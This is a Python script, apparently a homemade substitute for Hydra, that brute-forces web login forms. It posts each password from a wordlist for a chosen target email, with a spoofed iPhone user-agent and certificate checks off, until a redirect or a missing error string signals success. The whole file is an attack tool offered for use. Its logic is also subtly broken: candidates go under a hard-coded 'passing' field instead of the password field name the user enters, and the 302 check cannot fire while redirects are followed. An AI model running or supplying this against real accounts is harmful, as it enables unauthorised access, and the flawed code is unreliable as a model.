import requests

cow_say = '''
 ___________________
< Hydra driven me crazy! >
 -------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
'''

print(cow_say)

mode = input("Enter the number of the wanted mode:\n   1 - Word matching mode\n   2 - Status code mode (more efficient but not all servers return 302 as a redirection code): ")
url = input("Enter the target URL: ")
path = input("Enter the word list path: ")

if int(mode) == 1:
    word = input("Enter a word or a sentence that appears when an incorrect password is entered: ")

remail = input("Enter the target email: ")
email = input("Enter the name of the email input: ")
password = input("Enter the name of the password input: ")
sub = input("Enter the name of the thing that is used to submit the POST form (usually a button): ")

passw = []
with open(path, "r") as wordList:
    passw = wordList.read().splitlines()

parms = {
    email: remail,
    sub: "submit"
}

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
}

for pas in passw:
    parms["passing"] = pas
    res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)

    if int(mode) == 2:
        if res.status_code == 302:  # HTTP status code for redirect
            print(f"Password found: {parms['passing']}")
            break
    elif int(mode) == 1:
        if word not in res.text:
            print(f"Password found: {parms['passing']}")
            break
    else:
        print("Error")
        break
